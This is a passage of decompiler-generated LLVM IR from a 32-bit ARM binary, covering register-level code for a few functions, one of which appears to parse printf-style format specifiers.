dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e134, %dec_label_pc_e120, %dec_label_pc_e114, %dec_label_pc_e158
  %v1_e1a0 = add i32 %v3_e100, 4
  store i32 %v1_e1a0, i32* %r3.global-to-local, align 4
  store i32 %v1_e1a0, i32* %v2_e100, align 4
  %v0_e1a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e1a8 = inttoptr i32 %v0_e1a8 to i32*
  %v2_e1a8 = load i32, i32* %v1_e1a8, align 4
  store i32 %v2_e1a8, i32* %r3.global-to-local, align 4
  %v1_e1ac = load i32, i32* %ip.global-to-local, align 4
  %v2_e1ac = inttoptr i32 %v1_e1ac to i32*
  store i32 %v2_e1a8, i32* %v2_e1ac, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e188, %dec_label_pc_e174, %dec_label_pc_e160, %dec_label_pc_e1a0
  %v0_e1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1b0 = add i32 %v0_e1b0, 8
  store i32 %v1_e1b0, i32* %ip.global-to-local, align 4
  %v0_e1b4.pre = load i32, i32* @lr, align 4
  %v0_e1b8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e1b4

dec_label_pc_e1b4:                                ; preds = %dec_label_pc_e0f0, %dec_label_pc_e1b0
  %v0_e1b8 = phi i32 [ %v0_e1b825, %dec_label_pc_e0f0 ], [ %v0_e1b8.pre, %dec_label_pc_e1b0 ]
  %v0_e1b4 = phi i32 [ %v1_e0f024, %dec_label_pc_e0f0 ], [ %v0_e1b4.pre, %dec_label_pc_e1b0 ]
  %v1_e1b4 = add i32 %v0_e1b4, 1
  store i32 %v1_e1b4, i32* @lr, align 4
  %v1_e1b8 = add i32 %v0_e1b8, 28
  %v2_e1b8 = inttoptr i32 %v1_e1b8 to i32*
  %v3_e1b8 = load i32, i32* %v2_e1b8, align 4
  store i32 %v3_e1b8, i32* %r3.global-to-local, align 4
  %v5_e1c0 = icmp slt i32 %v1_e1b4, %v3_e1b8
  br i1 %v5_e1c0, label %dec_label_pc_e0f0, label %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e08c
  br i1 %v6_e0a4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_e1c8
  %v2_e1cc = add i32 %v0_e08c, 36
  %v3_e1cc = inttoptr i32 %v2_e1cc to i8*
  %v4_e1cc = load i8, i8* %v3_e1cc, align 1
  %v5_e1cc = zext i8 %v4_e1cc to i32
  %v5_e1d0 = mul nuw nsw i32 %v5_e1cc, 8
  %v6_e1d0 = add i32 %v5_e1d0, %v1_e098
  store i32 %v6_e1d0, i32* %r3.global-to-local, align 4
  %v2_e1d4 = add i32 %v6_e1d0, -8
  %v3_e1d4 = inttoptr i32 %v2_e1d4 to i32*
  %v4_e1d4 = load i32, i32* %v3_e1d4, align 4
  store i32 %v4_e1d4, i32* %r3.global-to-local, align 4
  store i32 %v4_e1d4, i32* %v2_e09c, align 4
  %v0_e1dc.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e1c8, %bb
  %v2_e1f0 = phi i32 [ %v0_e1dc.pre, %bb ], [ %v0_e08c, %dec_label_pc_e1c8 ]
  %v1_e1dc = add i32 %v2_e1f0, 4
  %v2_e1dc = inttoptr i32 %v1_e1dc to i32*
  %v3_e1dc = load i32, i32* %v2_e1dc, align 4
  store i32 %v3_e1dc, i32* %r3.global-to-local, align 4
  %v6_e1e0 = icmp eq i32 %v3_e1dc, -2147483648
  br i1 %v6_e1e0, label %bb15, label %dec_label_pc_e1c4

bb15:                                             ; preds = %.thread2
  %v2_e1e4 = add i32 %v2_e1f0, 37
  %v3_e1e4 = inttoptr i32 %v2_e1e4 to i8*
  %v4_e1e4 = load i8, i8* %v3_e1e4, align 1
  %v5_e1e4 = zext i8 %v4_e1e4 to i32
  %v1_e1e8 = load i32, i32* %ip.global-to-local, align 4
  %v5_e1e8 = mul nuw nsw i32 %v5_e1e4, 8
  %v6_e1e8 = add i32 %v5_e1e8, %v1_e1e8
  store i32 %v6_e1e8, i32* %r3.global-to-local, align 4
  %v2_e1ec = add i32 %v6_e1e8, -8
  %v3_e1ec = inttoptr i32 %v2_e1ec to i32*
  %v4_e1ec = load i32, i32* %v3_e1ec, align 4
  store i32 %v4_e1ec, i32* %r3.global-to-local, align 4
  store i32 %v4_e1ec, i32* %v2_e1dc, align 4
  %v0_e1f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e1c4

dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge: ; preds = %dec_label_pc_e1b4
  br label %dec_label_pc_e1c4.loopexit

dec_label_pc_e1c4.loopexit:                       ; preds = %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge, %dec_label_pc_e0e8
  %v0_e1b8.lcssa = phi i32 [ %v0_e1b8, %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge ], [ %v0_e1b818, %dec_label_pc_e0e8 ]
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1c4.loopexit, %.thread2, %bb15
  %v1_e214 = phi i32 [ %v0_e1b8.lcssa, %dec_label_pc_e1c4.loopexit ], [ %v2_e1f0, %.thread2 ], [ %v0_e1f4.pre, %bb15 ]
  %v1_e1f4 = add i32 %v1_e214, 8
  %v2_e1f4 = inttoptr i32 %v1_e1f4 to i32*
  %v3_e1f4 = load i32, i32* %v2_e1f4, align 4
  store i32 %v3_e1f4, i32* %r1.global-to-local, align 4
  %v1_e1f8 = icmp slt i32 %v3_e1f4, 0
  br i1 %v1_e1f8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_e1c4
  %v5_e1fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_e1fc, i32* @r4, align 4
  ret i32 %v1_e214

bb17:                                             ; preds = %dec_label_pc_e1c4
  %v1_e200 = add i32 %v1_e214, 16
  %v2_e200 = inttoptr i32 %v1_e200 to i32*
  %v3_e200 = load i32, i32* %v2_e200, align 4
  %v1_e208 = sub i32 0, %v3_e1f4
  store i32 %v1_e208, i32* %r1.global-to-local, align 4
  %v1_e204 = and i32 %v3_e200, -10
  %v1_e20c = or i32 %v1_e204, 8
  store i32 %v1_e20c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_e214 = add i32 %v1_e214, 20
  %v3_e214 = inttoptr i32 %v2_e214 to i32*
  store i32 32, i32* %v3_e214, align 4
  %v0_e218 = load i32, i32* %r1.global-to-local, align 4
  %v1_e218 = load i32, i32* @r0, align 4
  %v2_e218 = add i32 %v1_e218, 8
  %v3_e218 = inttoptr i32 %v2_e218 to i32*
  store i32 %v0_e218, i32* %v3_e218, align 4
  %v0_e21c = load i32, i32* %r3.global-to-local, align 4
  %v1_e21c = load i32, i32* @r0, align 4
  %v2_e21c = add i32 %v1_e21c, 16
  %v3_e21c = inttoptr i32 %v2_e21c to i32*
  store i32 %v0_e21c, i32* %v3_e21c, align 4
  %v2_e220 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e220, i32* @r4, align 4
  %v8_e220 = load i32, i32* @r0, align 4
  ret i32 %v8_e220

; uselistorder directives
  uselistorder i32 %v1_e1b4, { 2, 1, 0 }
  uselistorder i32 %v0_e1b8, { 1, 2, 0 }
  uselistorder i32 %v3_e100, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_e100, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_e0f4, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_e0f024, { 1, 0 }
  uselistorder i32 %v0_e1b818, { 2, 0, 1 }
  uselistorder i32 %v0_e08c, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_e1c4, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_e1b4, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e1a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e188, { 1, 0 }
  uselistorder label %dec_label_pc_e174, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_e0f0, { 1, 0 }
  uselistorder label %dec_label_pc_e0e8, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 0 }
}

define i32 @function_e228() local_unnamed_addr {
dec_label_pc_e228:
  %v1_e240.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e248, %dec_label_pc_e228
  %v0_e22c = phi i32 [ %v1_e22c, %dec_label_pc_e248 ], [ ptrtoint (i32* @global_var_16f20.354 to i32), %dec_label_pc_e228 ]
  %v1_e22c = add i32 %v0_e22c, -2
  %v1_e230 = add i32 %v0_e22c, -1
  %v2_e230 = inttoptr i32 %v1_e230 to i8*
  %v3_e230 = load i8, i8* %v2_e230, align 1
  %v4_e230 = zext i8 %v3_e230 to i32
  %v1_e234 = inttoptr i32 %v1_e22c to i8*
  %v2_e234 = load i8, i8* %v1_e234, align 2
  %v3_e234 = zext i8 %v2_e234 to i32
  %v3_e238 = mul nuw i32 %v4_e230, 16777216
  %v4_e23c = sdiv i32 %v3_e238, 65536
  %v5_e23c = or i32 %v4_e23c, %v3_e234
  %v9_e240 = icmp eq i32 %v5_e23c, %v1_e240.pre
  br i1 %v9_e240, label %dec_label_pc_e22c.dec_label_pc_e254_crit_edge, label %dec_label_pc_e248

dec_label_pc_e22c.dec_label_pc_e254_crit_edge:    ; preds = %dec_label_pc_e22c
  br label %dec_label_pc_e254

dec_label_pc_e248:                                ; preds = %dec_label_pc_e22c
  %tmp = icmp ugt i32 %v1_e22c, ptrtoint (i32* @global_var_16f08.356 to i32)
  br i1 %tmp, label %dec_label_pc_e22c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e248, %dec_label_pc_e22c.dec_label_pc_e254_crit_edge
  %v2_e25c.pre-phi = sub i32 %v1_e22c, ptrtoint (i32* @global_var_16f08.356 to i32)
  store i32 ptrtoint (i32* @global_var_16f20.354 to i32), i32* @r2, align 4
  %v4_e260 = sdiv i32 %v2_e25c.pre-phi, 2
  %v5_e260 = add i32 %v4_e260, ptrtoint (i32* @global_var_16f20.354 to i32)
  %v6_e260 = inttoptr i32 %v5_e260 to i8*
  %v7_e260 = load i8, i8* %v6_e260, align 1
  %v9_e260 = zext i8 %v7_e260 to i32
  ret i32 %v9_e260

; uselistorder directives
  uselistorder i32 %v1_e22c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e22c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16f20.354 to i32), { 1, 2, 0 }
}

define i32 @function_e274(i32* %arg1) local_unnamed_addr {
dec_label_pc_e274:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_e274 = load i32, i32* @r4, align 4
  store i32 %v3_e274, i32* %stack_var_-32, align 4
  %v6_e274 = load i32, i32* @r5, align 4
  %v25_e274 = ptrtoint i32* %stack_var_-32 to i32
  %v1_e278 = add i32 %tmp, 16
  %v2_e278 = inttoptr i32 %v1_e278 to i32*
  %v3_e278 = load i32, i32* %v2_e278, align 4
  %v2_e27c = ptrtoint i32* %stack_var_-88 to i32
  %v1_e280 = and i32 %v3_e278, 128
  store i32 %v1_e280, i32* @r4, align 4
  %v2_e280 = icmp eq i32 %v1_e280, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_e2a0 = add i32 %tmp, 24
  %v2_e2a0 = inttoptr i32 %v1_e2a0 to i32*
  %v3_e2a0 = load i32, i32* %v2_e2a0, align 4
  store i32 %v3_e2a0, i32* %sb.global-to-local, align 4
  br i1 %v2_e280, label %bb, label %dec_label_pc_e2c0

bb:                                               ; preds = %dec_label_pc_e274
  %v3_e2a4 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_e30c

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e490
  %v0_e2b0 = load i32, i32* %r0.global-to-local, align 4
  %v0_e4c0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e4bc
  %v1_e2b8 = add i32 %v0_e4c0.pre, 1
  store i32 %v1_e2b8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4d8

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e274
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge, %dec_label_pc_e2c0
  %v1_e2d4 = phi i32 [ %v1_e2e8, %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge ], [ 0, %dec_label_pc_e2c0 ]
  %v0_e2c4 = phi i32 [ %v0_e2c4.pre, %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge ], [ %tmp, %dec_label_pc_e2c0 ]
  %v1_e2c4 = inttoptr i32 %v0_e2c4 to i32*
  %v2_e2c4 = load i32, i32* %v1_e2c4, align 4
  %v4_e2c8 = mul i32 %v1_e2d4, 4
  %v5_e2c8 = add i32 %v2_e2c4, %v4_e2c8
  store i32 %v5_e2c8, i32* %r3.global-to-local, align 4
  %v1_e2cc = add i32 %v5_e2c8, -4
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  store i32 %v3_e2cc, i32* %r1.global-to-local, align 4
  store i32 %v25_e274, i32* @ip, align 4
  %v2_e2d4 = add i32 %v1_e2d4, %v25_e274
  store i32 %v2_e2d4, i32* %r2.global-to-local, align 4
  %v1_e2d8 = trunc i32 %v3_e2cc to i8
  %v3_e2d8 = add i32 %v2_e2d4, -56
  %v4_e2d8 = inttoptr i32 %v3_e2d8 to i8*
  store i8 %v1_e2d8, i8* %v4_e2d8, align 1
  %v0_e2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_e2dc = add i32 %v0_e2dc, -56
  %v2_e2dc = inttoptr i32 %v1_e2dc to i8*
  %v3_e2dc = load i8, i8* %v2_e2dc, align 1
  %v4_e2dc = zext i8 %v3_e2dc to i32
  store i32 %v4_e2dc, i32* %r2.global-to-local, align 4
  %v0_e2e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2e0 = add i32 %v0_e2e0, -4
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i32*
  %v3_e2e0 = load i32, i32* %v2_e2e0, align 4
  store i32 %v3_e2e0, i32* %r3.global-to-local, align 4
  %v9_e2e4 = icmp eq i32 %v4_e2dc, %v3_e2e0
  %v0_e2e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e2e8 = add i32 %v0_e2e8, 1
  store i32 %v1_e2e8, i32* %r0.global-to-local, align 4
  br i1 %v9_e2e4, label %dec_label_pc_e2f0, label %dec_label_pc_e708

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e2c4
  %v2_e2f0 = icmp eq i8 %v3_e2dc, 0
  br i1 %v2_e2f0, label %dec_label_pc_e300, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2f0
  %tmp166 = icmp ult i32 %v1_e2e8, 32
  br i1 %tmp166, label %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge, label %dec_label_pc_e300

dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge:    ; preds = %dec_label_pc_e2f8
  %v0_e2c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2f8, %dec_label_pc_e2f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e308 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %bb, %dec_label_pc_e300
  %storemerge102 = phi i32 [ %v2_e308, %dec_label_pc_e300 ], [ %v3_e2a4, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e318:                                ; preds = %.thread22, %dec_label_pc_e428
  %v0_e318 = phi i32 [ %v2_e4a0, %.thread22 ], [ %storemerge105, %dec_label_pc_e428 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_e428 ]
  store i32 %v0_e318, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e30c, %dec_label_pc_e318
  %v1_e338 = phi i32 [ %storemerge102, %dec_label_pc_e30c ], [ %v0_e318, %dec_label_pc_e318 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_e30c ], [ %stack_var_-48.0, %dec_label_pc_e318 ]
  %v1_e31c = inttoptr i32 %v1_e338 to i8*
  %v2_e31c = load i8, i8* %v1_e31c, align 1
  %v3_e31c = zext i8 %v2_e31c to i32
  store i32 %v3_e31c, i32* %r3.global-to-local, align 4
  %v7_e320 = icmp eq i8 %v2_e31c, 42
  br i1 %v7_e320, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_e31c
  store i32 %v1_e338, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_e31c
  %v1_e32c = load i32, i32* @lr, align 4
  %v4_e32c = mul i32 %v1_e32c, -4
  %v5_e32c = add i32 %v4_e32c, %v25_e274
  store i32 %v5_e32c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e338 = add i32 %v1_e338, 1
  store i32 %v2_e338, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_e340 = add i32 %v5_e32c, -12
  %v4_e340 = inttoptr i32 %v3_e340 to i32*
  store i32 0, i32* %v4_e340, align 4
  %v0_e364.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_e364.pre = phi i32 [ %v0_e364.pre.pre, %bb124 ], [ %v1_e338, %.thread9.thread ]
  %v2_e368.pre = load i32, i32* @global_var_205f0, align 4
  br label %.backedge

dec_label_pc_e348:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_e34c = load i32, i32* %r0.global-to-local, align 4
  %v7_e350 = icmp sgt i32 %v0_e34c, 4094
  br i1 %v7_e350, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_e348
  %v1_e35814 = add i32 %v0_e3dc, 1
  store i32 %v1_e35814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_e348
  %v11_e354 = mul i32 %v0_e34c, 10
  %v12_e354 = add i32 %v11_e354, %v3_e364
  store i32 %v12_e354, i32* %r3.global-to-local, align 4
  %v1_e358 = add i32 %v0_e3dc, 1
  store i32 %v1_e358, i32* %r6.global-to-local, align 4
  %v9_e35c = add i32 %v12_e354, -48
  store i32 %v9_e35c, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_e3dc = phi i32 [ %v0_e364.pre, %.preheader ], [ %v1_e358, %bb126 ], [ %v1_e35814, %.thread12 ]
  store i32 132592, i32* %r3.global-to-local, align 4
  %v1_e364 = inttoptr i32 %v0_e3dc to i8*
  %v2_e364 = load i8, i8* %v1_e364, align 1
  %v3_e364 = zext i8 %v2_e364 to i32
  store i32 %v3_e364, i32* %r2.global-to-local, align 4
  store i32 %v2_e368.pre, i32* %r3.global-to-local, align 4
  %v3_e36c = mul nuw nsw i32 %v3_e364, 2
  %v4_e36c = add i32 %v3_e36c, %v2_e368.pre
  %v5_e36c = inttoptr i32 %v4_e36c to i8*
  %v6_e36c = load i8, i8* %v5_e36c, align 1
  %v8_e36c = zext i8 %v6_e36c to i32
  store i32 %v8_e36c, i32* %r3.global-to-local, align 4
  %v1_e370 = and i32 %v8_e36c, 8
  %v2_e370 = icmp eq i32 %v1_e370, 0
  br i1 %v2_e370, label %dec_label_pc_e378, label %dec_label_pc_e348

dec_label_pc_e378:                                ; preds = %.backedge
  %v0_e378 = load i32, i32* %r1.global-to-local, align 4
  %v1_e378 = add i32 %v0_e378, -1
  %v2_e378 = inttoptr i32 %v1_e378 to i8*
  %v3_e378 = load i8, i8* %v2_e378, align 1
  %v4_e378 = zext i8 %v3_e378 to i32
  store i32 %v4_e378, i32* %r3.global-to-local, align 4
  %v7_e37c = icmp eq i8 %v3_e378, 37
  br i1 %v7_e37c, label %dec_label_pc_e384, label %dec_label_pc_e440

dec_label_pc_e384:                                ; preds = %dec_label_pc_e378
  %v7_e384 = icmp eq i8 %v2_e364, 36
  %. = zext i1 %v7_e384 to i32
  store i32 %., i32* @ip, align 4
  %v0_e390 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_e390, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_e384
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e384, %bb130
  %v1_e3ec = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_e384 ]
  %v2_e398 = icmp eq i32 %v1_e3ec, 0
  %v0_e3c8 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_e398, label %dec_label_pc_e3c8, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %thread-pre-split
  %v2_e3c8 = icmp eq i32 %v0_e3c8, 0
  %v1_e3a4 = add i32 %v0_e3dc, 1
  store i32 %v1_e3a4, i32* %r1.global-to-local, align 4
  br i1 %v2_e3c8, label %dec_label_pc_e708, label %dec_label_pc_e3ac

dec_label_pc_e3ac:                                ; preds = %dec_label_pc_e3a0
  %v2_e3ac = sub i32 %v0_e390, %v0_e3c8
  %v4_e3ac = xor i32 %v0_e3c8, %v0_e390
  %v5_e3ac = xor i32 %v2_e3ac, %v0_e390
  %v6_e3ac = and i32 %v5_e3ac, %v4_e3ac
  %v7_e3ac = icmp slt i32 %v6_e3ac, 0
  %v8_e3ac = icmp slt i32 %v2_e3ac, 0
  %v9_e3ac = icmp eq i32 %v0_e390, %v0_e3c8
  %v3_e3b0 = xor i1 %v8_e3ac, %v7_e3ac
  %v4_e3b0 = or i1 %v9_e3ac, %v3_e3b0
  br i1 %v4_e3b0, label %dec_label_pc_e3c0, label %bb131

bb131:                                            ; preds = %dec_label_pc_e3ac
  store i32 %v0_e390, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e3c0

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e3dc, %dec_label_pc_e3e4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e3c0

dec_label_pc_e3c0:                                ; preds = %bb131, %dec_label_pc_e3ac, %dec_label_pc_e3bc
  %v0_e3c0 = phi i32 [ %v0_e378, %dec_label_pc_e3bc ], [ %v1_e3a4, %dec_label_pc_e3ac ], [ %v1_e3a4, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e3bc ], [ %v0_e390, %dec_label_pc_e3ac ], [ %v0_e390, %bb131 ]
  br label %dec_label_pc_e3f8

dec_label_pc_e3c8:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_e3c8, 1
  br i1 %tmp132, label %dec_label_pc_e3dc, label %dec_label_pc_e3d0

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e3c8
  %v7_e3d0 = icmp eq i8 %v2_e364, 109
  br i1 %v7_e3d0, label %dec_label_pc_e440, label %dec_label_pc_e708

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_e3c8
  %tmp167 = icmp ugt i32 %v0_e3dc, %v0_e378
  br i1 %tmp167, label %dec_label_pc_e3e4, label %dec_label_pc_e3bc

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3dc
  %v1_e3e4 = inttoptr i32 %v0_e378 to i8*
  %v2_e3e4 = load i8, i8* %v1_e3e4, align 1
  %v3_e3e4 = zext i8 %v2_e3e4 to i32
  store i32 %v3_e3e4, i32* %r3.global-to-local, align 4
  %v7_e3e8 = icmp eq i8 %v2_e3e4, 48
  br i1 %v7_e3e8, label %dec_label_pc_e3bc, label %bb133

bb133:                                            ; preds = %dec_label_pc_e3e4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e440

dec_label_pc_e3f8.loopexit:                       ; preds = %dec_label_pc_e400
  %v1_e40c = load i32, i32* @r4, align 4
  %v3_e40c = or i32 %v1_e40c, %v0_e420
  store i32 %v3_e40c, i32* @r4, align 4
  %v2_e410 = add i32 %storemerge105, 1
  br label %dec_label_pc_e3f8

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3f8.loopexit, %dec_label_pc_e3c0
  %storemerge105 = phi i32 [ %v0_e3c0, %dec_label_pc_e3c0 ], [ %v2_e410, %dec_label_pc_e3f8.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16f00.363 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e404 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_e400

dec_label_pc_e400:                                ; preds = %dec_label_pc_e418, %dec_label_pc_e3f8
  %v0_e420 = phi i32 [ %v2_e420, %dec_label_pc_e418 ], [ 1, %dec_label_pc_e3f8 ]
  %v0_e400 = phi i32 [ %v5_e400, %dec_label_pc_e418 ], [ ptrtoint ([8 x i8]* @global_var_16f00.363 to i32), %dec_label_pc_e3f8 ]
  %v1_e400 = inttoptr i32 %v0_e400 to i8*
  %v2_e400 = load i8, i8* %v1_e400, align 1
  %v3_e400 = zext i8 %v2_e400 to i32
  store i32 %v3_e400, i32* %r2.global-to-local, align 4
  %v5_e400 = add i32 %v0_e400, 1
  store i32 %v5_e400, i32* %r1.global-to-local, align 4
  %v2_e404 = load i8, i8* %v1_e404, align 1
  %v3_e404 = zext i8 %v2_e404 to i32
  store i32 %v3_e404, i32* %r3.global-to-local, align 4
  %v9_e408 = icmp eq i8 %v2_e404, %v2_e400
  br i1 %v9_e408, label %dec_label_pc_e3f8.loopexit, label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e400
  %v1_e418 = inttoptr i32 %v5_e400 to i8*
  %v2_e418 = load i8, i8* %v1_e418, align 1
  %v3_e418 = zext i8 %v2_e418 to i32
  store i32 %v3_e418, i32* %r3.global-to-local, align 4
  %v2_e41c = icmp eq i8 %v2_e418, 0
  %v2_e420 = mul i32 %v0_e420, 2
  store i32 %v2_e420, i32* %r0.global-to-local, align 4
  br i1 %v2_e41c, label %dec_label_pc_e428, label %dec_label_pc_e400

dec_label_pc_e428:                                ; preds = %dec_label_pc_e418
  %v1_e428 = add i32 %storemerge105, -1
  %v2_e428 = inttoptr i32 %v1_e428 to i8*
  %v3_e428 = load i8, i8* %v2_e428, align 1
  %v7_e42c = icmp eq i8 %v3_e428, 37
  %v0_e430 = load i32, i32* @r4, align 4
  %v1_e430 = and i32 %v0_e430, 10
  store i32 %v1_e430, i32* %r3.global-to-local, align 4
  %v4_e434 = udiv i32 %v1_e430, 2
  %v5_e434 = sub nuw nsw i32 -1, %v4_e434
  %v6_e434 = and i32 %v0_e430, %v5_e434
  store i32 %v6_e434, i32* @r4, align 4
  br i1 %v7_e42c, label %dec_label_pc_e43c, label %dec_label_pc_e318

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e428
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %bb133, %dec_label_pc_e378, %dec_label_pc_e3d0, %dec_label_pc_e43c
  %v1_e484 = phi i32 [ %storemerge105, %dec_label_pc_e43c ], [ %v0_e3dc, %bb133 ], [ %v0_e3dc, %dec_label_pc_e3d0 ], [ %v0_e3dc, %dec_label_pc_e378 ]
  %v0_e480 = phi i32 [ %v5_e400, %dec_label_pc_e43c ], [ %v0_e378, %bb133 ], [ %v0_e378, %dec_label_pc_e3d0 ], [ %v0_e378, %dec_label_pc_e378 ]
